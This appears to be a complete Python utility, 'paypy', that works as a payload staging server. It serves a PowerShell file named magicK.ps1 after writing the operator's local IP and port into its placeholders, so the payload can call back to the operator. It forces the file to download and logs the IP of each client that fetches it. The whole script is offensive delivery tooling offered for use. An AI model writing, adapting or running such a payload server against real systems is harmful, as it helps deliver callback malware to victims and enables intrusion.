#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
from socket import socket, AF_INET, SOCK_DGRAM
from colorama import Fore, Style
from sys import exit, argv, stdout
from time import strftime

class DownloadHandler(SimpleHTTPRequestHandler):
	def end_headers(self):
		filename=self.base_path.split('/')[-1]
		self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
		super().end_headers()

	def log_message(self, format, *args):
		client_ip=self.client_address[0]
		current_time=strftime('%Y-%m-%d %H:%M:%S')
		stdout.write(f'{Fore.RED}[paypy]{Style.RESET_ALL} {current_time} - {client_ip} - {format % args}\n')
		stdout.flush()

	def do_GET(self):
		if self.path.endswith('/magicK.ps1'):
			with open(self.base_path, 'r') as f:
				payload_content=f.read()
			
			# preparing files
			payload_content=payload_content.replace('<SERVER_IP>', local_ip)
			payload_content=payload_content.replace('<SERVER_PORT>', str(port))

			# serving modified content
			self.send_response(200)
			self.send_header('Content-type', 'application/octet-stream')
			self.send_header('Content-Disposition', 'attachment; filename="magicK.ps1"')
			self.end_headers()
			self.wfile.write(payload_content.encode())
		else:
			super().do_GET()

def get_local_ip():
	s=socket(AF_INET, SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	local_ip=s.getsockname()[0]
	s.close()
	return local_ip

# warn
if len(argv) != 3:
	print('usage: paypy <port> </payload/path>')
	exit(1)

# config
port=int(argv[1])
file_path=argv[2]
DownloadHandler.base_path=file_path
local_ip=get_local_ip()

# start server
httpd=HTTPServer((local_ip, port), DownloadHandler)
print(f'{Fore.RED}[paypy]{Style.RESET_ALL} local server started: {local_ip}:{port}')
print(f'{Fore.RED}[paypy]{Style.RESET_ALL} downloadable payload: {file_path}')
stdout.flush()

httpd.serve_forever()
